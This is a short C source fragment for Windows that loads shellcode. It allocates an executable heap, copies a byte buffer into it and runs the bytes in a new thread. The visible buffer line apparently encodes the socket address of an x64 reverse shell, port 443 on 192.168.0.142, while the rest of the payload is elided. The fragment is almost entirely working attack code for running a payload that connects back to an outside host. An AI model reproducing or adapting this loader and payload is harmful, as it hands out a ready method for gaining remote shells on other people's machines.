...
"\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x00\x8e\x41\x54\x49\x89\xe4"
...
int main() {
    //RCX, RDX, R8, R9 - RSP
    //RAX = return value
    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); // only reserves this section, does not allocate the memory
    if (hHeap) {
        LPVOID haddressPointer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 1024); // allocated region
        if (haddressPointer) {
            printf("addressPointer: 0x%x\n", haddressPointer);
            memcpy(haddressPointer, buf, 511);
            printf("Executing funcn\n");

            HANDLE hctr = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)haddressPointer, 0, 0, 0);
            if (hctr) {
                printf("Thread created\n");
                WaitForSingleObject(hctr, -1);
            }
            //((void(*)())haddressPointer)();
            HeapFree(hHeap, 0, haddressPointer);
            CloseHandle(hHeap);
        }
    }
    return 0;
